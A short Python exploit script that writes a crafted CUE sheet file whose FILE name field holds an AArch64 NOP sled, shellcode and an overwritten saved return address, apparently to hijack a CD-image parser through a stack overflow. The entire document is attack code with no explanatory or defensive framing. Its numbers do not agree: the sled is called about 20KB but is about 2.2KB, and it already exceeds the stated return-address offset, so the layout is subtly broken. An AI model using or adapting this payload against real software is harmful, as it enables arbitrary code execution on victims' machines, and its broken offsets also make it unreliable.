#!/usr/bin/env python3
import struct

BUF_ADDR   = 0xffffffffdd28     # address of current_track_path
RET_ADDR   = BUF_ADDR + 0x100   # jump into NOP sled
OFFSET_LR  = 2128               # distance to saved LR (x30)

shellcode = (
    b"\xe1\x45\x8c\xd2\x21\xcd\xad\xf2\xe1\x65\xce\xf2"
    b"\x01\x0d\xe0\xf2\xe1\x8f\x1f\xf8\xe1\x03\x1f\xaa"
    b"\xe2\x03\x1f\xaa\xe0\x63\x21\x8b\xa8\x1b\x80\xd2"
    b"\xe1\x66\x02\xd4"
)

nop = b"\x1f\x20\x03\xd5"
nop_sled = nop * 550        # massive overflow (~20KB)

payload = nop_sled + shellcode
payload = payload.ljust(OFFSET_LR, b"A")
payload += struct.pack("<Q", RET_ADDR)

with open("formats/cdfs/overflow.cue", "wb") as f:
    f.write(b'FILE "')
    f.write(payload)               # overflow inside filename
    f.write(b'" BINARY\n')
    f.write(b'  TRACK 01 MODE1/2352\n')
    f.write(b'    INDEX 01 00:00:00\n')
